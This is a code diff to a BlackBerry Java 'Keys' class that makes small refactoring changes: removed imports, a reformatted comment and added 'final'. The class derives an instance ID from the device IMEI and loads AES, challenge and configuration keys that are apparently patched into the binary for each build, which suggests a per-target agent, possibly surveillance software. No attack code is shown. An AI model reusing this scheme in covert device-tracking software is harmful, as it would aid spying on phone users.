@@ -9,10 +9,8 @@
 package blackberry.config;
 
 import net.rim.device.api.system.GPRSInfo;
-import net.rim.device.api.system.RuntimeStore;
 import blackberry.crypto.Encryption;
 import blackberry.interfaces.Singleton;
-import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
@@ -50,13 +48,14 @@ public final class Keys implements Singleton {
      */
     public static synchronized Keys getInstance() {
         if (instance == null) {
-          /*  instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
-
-            if (instance == null) {
-                Keys singleton = new Keys();
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
-                instance = singleton;
-            }*/
+            /*
+             * instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
+             * if (instance == null) {
+             * Keys singleton = new Keys();
+             * RuntimeStore.getRuntimeStore().put(GUID, singleton);
+             * instance = singleton;
+             * }
+             */
             instance = new Keys();
         }
         return instance;
@@ -76,20 +75,20 @@ public final class Keys implements Singleton {
         instanceKeys = new InstanceKeys();
         final byte[] imei = GPRSInfo.getIMEI();
         byteInstanceID = Encryption.SHA1(imei);
-        
+
         //#ifdef FAKE323   
         if (!hasBeenBinaryPatched()) {
-            InstanceKeysEmbedded instance = new InstanceKeys323();
+            final InstanceKeysEmbedded instance = new InstanceKeys323();
             instance.injectKeys(instanceKeys);
-            
+
         }
         //#endif        
         setInstanceKeys();
-        
+
     }
 
     private void setInstanceKeys() {
-        
+
         byteAesKey = instanceKeys.getAesKey();
         byteChallengeKey = instanceKeys.getChallengeKey();
         byteConfKey = instanceKeys.getConfKey();
